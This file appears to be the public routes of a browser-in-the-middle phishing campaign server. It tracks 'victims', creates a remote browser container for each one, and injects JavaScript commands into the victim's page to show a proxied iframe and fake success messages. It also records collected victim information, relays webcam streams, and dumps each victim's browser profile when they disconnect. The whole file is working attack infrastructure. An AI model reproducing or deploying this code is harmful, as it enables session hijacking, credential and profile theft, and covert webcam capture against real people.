# campaign-backend/routes/public.py

import logging
import asyncio
import time
from urllib.parse import quote

from fastapi import (
    APIRouter,
    Header,
    Query,
    Response,
    WebSocket,
    WebSocketDisconnect,
)
from fastapi.responses import RedirectResponse

from config import settings
from core.client_ip import get_public_client_ip
from core.container_orchestrator import (
    create_victim_container,
    destroy_victim_container,
    dump_victim_container,
)
from core.gateway_auth import is_gateway_request_authorized
from core.stream_access import stream_access
from core.session_admission import SessionAdmissionController
from core.session_tokens import SessionTokenError, verify_session_token
from core.websocket_messages import (
    ClientMessageError,
    WebSocketMessageLimiter,
    parse_collected_info,
    parse_structured_client_message,
)
from core.websocket_manager import ws_manager

# ✅ Import funzioni DB
from db.database import (
    EventType,
    update_victim_status,
    update_victim_collected_info,
    new_victim_event
)

logger = logging.getLogger(__name__)
public_router = APIRouter()

session_admission = SessionAdmissionController(
    max_active_sessions=settings.MAX_ACTIVE_SESSIONS,
    rate_limit_window_seconds=settings.WS_RATE_LIMIT_WINDOW_SECONDS,
    max_attempts_per_client=settings.WS_RATE_LIMIT_MAX_ATTEMPTS,
    max_attempts_global=settings.WS_GLOBAL_RATE_LIMIT_MAX_ATTEMPTS,
)
ws_manager.max_pending_candidates = settings.WS_MAX_WEBRTC_CANDIDATES


# ========================================
# PUBLIC ENDPOINTS
# ========================================


async def _cleanup_victim_container(
    victim_id: str,
    *,
    persist_profile: bool,
) -> None:
    """Persist evidence before removing an inactive victim container."""
    if persist_profile:
        try:
            await dump_victim_container(victim_id)
        except Exception:
            logger.exception(
                "Failed to dump data for session %s; preserving its container",
                victim_id,
            )
            return

    # Dumping can take long enough for a replacement WebSocket to connect.
    # Re-check immediately before deletion so stale cleanup cannot remove the
    # active session's container.
    if ws_manager.is_victim_connected(victim_id):
        return

    try:
        await destroy_victim_container(victim_id)
    except Exception:
        logger.exception("Failed to clean up victim container %s", victim_id)


@public_router.get("/internal/gateway/session-auth", include_in_schema=False)
async def authorize_victim_gateway(
    x_victim_id: str | None = Header(default=None),
    x_stream_route: str | None = Header(default=None),
    x_gateway_auth: str | None = Header(default=None),
    x_stream_access: str | None = Header(default=None),
) -> Response:
    """Allow nginx to reach only an authenticated, live victim session."""
    resolved_victim_id = x_victim_id
    if x_stream_route:
        resolved_victim_id = await stream_access.authorize(
            x_stream_route,
            x_stream_access,
        )
    elif settings.CAMPAIGN_PROTOCOL == "selkies":
        resolved_victim_id = None
    if not is_gateway_request_authorized(
        resolved_victim_id,
        x_gateway_auth,
        settings.GATEWAY_AUTH_KEY,
        ws_manager.get_active_victims(),
    ):
        return Response(status_code=403)
    return Response(
        status_code=204,
        headers={"X-BITM-Victim-ID": resolved_victim_id or ""},
    )


@public_router.get(
    "/internal/gateway/stream-bootstrap/{route_handle}/{bootstrap_token}",
    include_in_schema=False,
)
async def bootstrap_victim_stream(
    route_handle: str,
    bootstrap_token: str,
) -> Response:
    """Exchange a one-time URL capability for a path-scoped stream session."""
    grant = await stream_access.consume(route_handle, bootstrap_token)
    if (
        grant is None
        or grant.victim_id not in ws_manager.get_active_victims()
    ):
        logger.warning(
            "Rejected stream bootstrap for route %s: invalid, expired, or "
            "already-consumed capability",
            route_handle,
        )
        return Response(status_code=403)

    logger.info(
        "Stream viewer session started for victim %s (role=%s)",
        grant.victim_id,
        grant.role,
    )

    base_path = (
        f"/{settings.CAMPAIGN_ID}"
        if settings.ENVIRONMENT != "production"
        else ""
    )
    public_path = f"{base_path}/{settings.STREAM_PATH}/{route_handle}/"
    response = RedirectResponse(
        url=f"{public_path}#token={quote(grant.client_token, safe='')}",
        status_code=303,
    )
    response.set_cookie(
        key=settings.STREAM_COOKIE_NAME,
        value=grant.session_token,
        max_age=max(1, int(grant.expires_at - time.time())),
        path=public_path,
        secure=True,
        httponly=True,
        samesite="none",
    )
    response.headers["Set-Cookie"] = (
        f'{response.headers["Set-Cookie"]}; Partitioned'
    )
    response.headers["Cache-Control"] = "no-store"
    return response


@public_router.websocket("/ws")
async def websocket_endpoint(
    websocket: WebSocket,
    theme: str = Query(default="light")
):
    """Authorize and manage one public browser session."""
    await websocket.accept()

    victim_id = None
    session_data = None
    reservation_held = False
    registered = False
    session_started = False
    creation_attempted = False
    client_ip = get_public_client_ip(websocket)
    last_activity_update = 0.0
    collected_info_saved = False
    message_limiter = WebSocketMessageLimiter(
        max_message_bytes=settings.WS_MAX_MESSAGE_BYTES,
        window_seconds=settings.WS_MESSAGE_RATE_WINDOW_SECONDS,
        max_messages=settings.WS_MESSAGE_RATE_MAX_MESSAGES,
    )

    try:
        attempt = await session_admission.allow_attempt(client_ip)
        if not attempt.allowed:
            logger.warning("Rejected WebSocket connection: %s", attempt.reason)
            await websocket.close(code=1013, reason="Session capacity unavailable")
            return

        message = await asyncio.wait_for(
            websocket.receive_text(),
            timeout=settings.WS_HANDSHAKE_TIMEOUT_SECONDS,
        )
        if len(message.encode("utf-8")) > 4096:
            await websocket.close(code=1009, reason="Handshake message too large")
            return
        if not message.startswith("session:"):
            logger.warning("Rejected WebSocket connection with invalid handshake")
            await websocket.close(code=1008, reason="Invalid session authorization")
            return

        raw_token = message.split(":", 1)[1]
        claims = verify_session_token(
            raw_token,
            campaign_id=settings.CAMPAIGN_ID,
            secret=settings.SESSION_TOKEN_SECRET,
        )
        victim_id = claims.victim_id

        reservation = await session_admission.reserve(
            victim_id,
            ws_manager.get_active_victims(),
        )
        if not reservation.allowed:
            close_code = 1013 if reservation.reason == "capacity" else 1008
            logger.warning(
                "Rejected session for victim %s: %s",
                victim_id,
                reservation.reason,
            )
            await websocket.close(code=close_code, reason="Session unavailable")
            return
        reservation_held = True

        await ws_manager.connect_victim(victim_id, websocket)
        registered = True
        await session_admission.release(victim_id)
        reservation_held = False

        user_agent = websocket.headers.get("user-agent", "unknown")
        safe_theme = theme if theme in {"light", "dark", "unknown"} else "light"

        creation_attempted = True
        session_data = await asyncio.wait_for(
            create_victim_container(
                victim_id,
                user_agent,
                safe_theme,
                settings.CAMPAIGN_HOST,
            ),
            timeout=settings.WS_SESSION_STARTUP_TIMEOUT_SECONDS,
        )

        update_victim_status(victim_id, "active")
        session_started = True

        new_victim_event(
            victim_id=victim_id,
            event_type=EventType.VICTIM_CONNECTED.value,
            payload={
                "ip_address": client_ip,
                "user_agent": user_agent,
                "theme": safe_theme
            }
        )

        logger.info("Authorized session %s is active", victim_id)

        await websocket.send_text(f"collectinfo:{victim_id}")
        if settings.CAMPAIGN_PROTOCOL == "selkies":
            service_url = await stream_access.issue(
                victim_id,
                "controller",
                settings.STREAM_ACCESS_TTL_SECONDS,
            )
        else:
            service_url = session_data["service_url"]
        await websocket.send_text(f"exec:window.Controller.setIframeSrc('{service_url}');")

        await asyncio.sleep(4)
        await websocket.send_text(f"exec:window.Controller.showSuccess();")
        await asyncio.sleep(2)
        await websocket.send_text(f"exec:window.Controller.showContent();")

        while True:
            response = await websocket.receive_text()
            logger.debug("[SESSION %s] WebSocket message received", victim_id)

            decision = message_limiter.check(response)
            if not decision.allowed:
                close_code = 1009 if decision.reason == "message_too_large" else 1008
                logger.warning(
                    "Closing session %s: %s",
                    victim_id,
                    decision.reason,
                )
                await websocket.close(
                    code=close_code,
                    reason="WebSocket message limit exceeded",
                )
                return

            if response == "pong":
                now = time.monotonic()
                if now - last_activity_update >= 15:
                    await asyncio.to_thread(
                        update_victim_status,
                        victim_id,
                        "active",
                    )
                    last_activity_update = now
                continue

            try:
                data = parse_structured_client_message(response)
                if data is not None:
                    msg_type = data["type"]

                    if msg_type in (
                        "webrtc-offer",
                        "webrtc-candidate",
                        "webcam-error",
                    ):
                        signaling_result = (
                            await ws_manager.handle_victim_webrtc_message(
                                victim_id,
                                data,
                            )
                        )
                        if signaling_result == "limit":
                            await websocket.close(
                                code=1008,
                                reason="WebRTC signaling limit exceeded",
                            )
                            return
                        if signaling_result == "stale":
                            logger.warning(
                                "Ignored stale webcam signaling for session %s",
                                victim_id,
                            )
                        continue

                info = parse_collected_info(response)
                if info is not None:
                    if collected_info_saved:
                        logger.warning(
                            "Ignored repeated collected info from session %s",
                            victim_id,
                        )
                        continue
                    await asyncio.to_thread(
                        update_victim_collected_info,
                        victim_id,
                        info,
                    )
                    collected_info_saved = True
                    await websocket.send_text("[DATA SAVED]")
                    continue
            except ClientMessageError:
                logger.warning("Rejected invalid message from session %s", victim_id)
                await websocket.close(code=1008, reason="Invalid WebSocket message")
                return

    except WebSocketDisconnect:
        logger.info("Session %s disconnected", victim_id or "unauthorized")
    except asyncio.TimeoutError:
        logger.warning("Session %s timed out during setup", victim_id or "unauthorized")
        try:
            await websocket.close(code=1013, reason="Session startup timed out")
        except Exception:
            pass
    except SessionTokenError:
        logger.warning("Rejected WebSocket connection with an invalid session token")
        try:
            await websocket.close(code=1008, reason="Invalid session authorization")
        except Exception:
            pass
    except Exception:
        logger.exception("WebSocket session failed")
        try:
            await websocket.close(code=1011, reason="Session setup failed")
        except Exception:
            pass
    finally:
        if reservation_held:
            await session_admission.release(victim_id)

        connection_removed = False
        if registered and victim_id:
            connection_removed = await ws_manager.disconnect_victim(
                victim_id,
                websocket,
            )
            if connection_removed:
                update_victim_status(victim_id, "disconnected")
                await stream_access.revoke_victim(victim_id)

        if session_started and victim_id and connection_removed:
            try:
                new_victim_event(
                    victim_id=victim_id,
                    event_type=EventType.VICTIM_DISCONNECTED.value,
                    payload={},
                )
            except Exception:
                logger.exception("Failed to record disconnect for session %s", victim_id)

        if creation_attempted and victim_id and connection_removed:
            await _cleanup_victim_container(
                victim_id,
                persist_profile=session_data is not None,
            )
